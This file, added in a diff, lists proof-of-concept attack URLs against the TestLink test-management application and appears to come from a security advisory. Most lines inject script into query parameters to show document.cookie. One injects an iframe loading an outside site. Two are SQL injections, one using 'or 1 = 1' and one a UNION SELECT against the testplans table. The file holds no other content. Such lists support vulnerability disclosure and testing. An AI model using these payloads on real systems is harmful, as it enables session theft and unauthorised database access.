@@ -1,0 +1,13 @@
+http://www.example.com/testlink/login.php?req=&quot;&gt;&lt;iframe src =&quot;http://www.coresecurity.com/content/xxxx&quot; width=&quot;100%&quot; height=&quot;300&quot;&gt;&lt;/iframe&gt;
+http://www.example.com/testlink/lib/general/staticPage.php?key=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+http://www.example.com/testlink/lib/attachments/attachmentupload.php?id=1&amp;tableName=&#039;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/testlink/lib/events/eventviewer.php?startDate=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/testlink/lib/events/eventviewer.php?endDate=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/testlink/lib/events/eventviewer.php?logLevel=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com//testlink/lib/testcases/searchData.php?doSearch=find&amp;summary=&#039;&amp;expected_results=&#039;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com//testlink/lib/testcases/searchData.php?doSearch=find&amp;summary=&#039;&amp;name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com//testlink/lib/testcases/searchData.php?doSearch=find&amp;summary=&#039;&amp;steps=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com//testlink/lib/testcases/searchData.php?doSearch=find&amp;summary=&#039;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/testlink/lib/results/resultsMoreBuilds_buildReport.php?report_type=0&amp;display_query_params=1&amp;search_notes_string=&lt;/td&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/testlink/lib/general/navBar.php filling in the &#039;Test Case ID&#039; field with &#039;TC-1 or 1 = 1
+http://www.example.com/testlink/lib/events/eventviewer.php?logLevel=1,1)%20union%20SELECT%20id%20FROM%20testplans%20%23
